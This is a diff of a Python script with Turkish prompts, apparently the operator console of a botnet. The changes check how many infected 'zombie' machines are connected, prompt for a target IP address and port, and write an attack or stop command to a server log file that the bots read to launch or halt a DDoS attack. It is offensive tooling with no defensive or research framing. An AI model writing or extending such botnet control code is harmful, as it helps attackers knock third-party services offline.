@@ -197,6 +197,9 @@ try:
         version = "???"
 except:
     pass
+if "\n" in version:
+    version = version.split("\n")
+    version = version[0]
 num = 0
 other = 0
 copy = 0
@@ -733,27 +736,30 @@ while True:
                 print(f'$SUNUCU {server_num}: "{i}"')
             print('')
     elif choices == 13:
-        if ddos == False or ddos == "" or ddos == None:
-            print(Fore.RED+'[-]'+Fore.RESET+' DDOS saldırısı çalışmıyor!')
-        else:
-            print(Fore.BLUE+'[i]'+Fore.RESET+' Tüm saldırılar durdurulur...')
-            try:
-                with open(current_path+'/server/cmd.log', 'w') as f:
-                    f.write("stop")
-            except:
-                pass
-            print(Fore.YELLOW+'[+]'+Fore.RESET+' Sunucuya Durdurma Komutu gönderildi!')
-    elif choices == 12:
-        ip = input(Fore.CYAN+'[?]'+Fore.RESET+' Saldırı için lütfen hedef IP adresini girin: ').strip(" ")
-        port = int(input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen Hedef bağlantı noktasını girin (Port): ').strip(" "))
-        print(Fore.BLUE+'[i]'+Fore.RESET+' Hedef hakkında bilgi toplanıyor...')
-        time.sleep(0.5)
+        if zombies == 0 or zombies_list == []:
+            print(Fore.RED+'[-]'+Fore.RESET+' Zombin yok ama yine de gönderiyorum...')
+        print(Fore.BLUE+'[i]'+Fore.RESET+' Tüm saldırılar durdurulur...')
         try:
-            with open(current_path+'/server/cmd.log', "w") as f:
-                f.write(f"ip {ip} {port}")
+            with open(current_path+'/server/cmd.log', 'w') as f:
+                f.write("stop")
         except:
             pass
-        print(Fore.YELLOW+'[+]'+Fore.RESET+' Saldırı komutu başarıyla sunucuya gönderildi!')
+        print(Fore.YELLOW+'[+]'+Fore.RESET+' Sunucuya Durdurma Komutu gönderildi!')
+    elif choices == 12:
+        if zombies == 0 or zombies_list == []:
+            print(Fore.RED+'[-]'+Fore.RESET+' Şu anda zombin yok!')
+        else:
+            ip = input(Fore.CYAN+'[?]'+Fore.RESET+' Saldırı için lütfen hedef IP adresini girin: ').strip(" ")
+            port = int(input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen Hedef bağlantı noktasını girin (Port): ').strip(" "))
+            print(Fore.BLUE+'[i]'+Fore.RESET+' Hedef hakkında bilgi toplanıyor...')
+            time.sleep(0.5)
+            ddos = True
+            try:
+                with open(current_path+'/server/cmd.log', "w") as f:
+                    f.write(f"ip {ip} {port}")
+            except:
+                pass
+            print(Fore.YELLOW+'[+]'+Fore.RESET+' Saldırı komutu başarıyla sunucuya gönderildi!')
     elif choices == 4:
         cont = input(Fore.CYAN+'[?]'+Fore.RESET+' Gerçekten tüm zombileri kaldırmak istiyor musun? (Y/n): ').strip(" ")
         if cont in chars[0]:
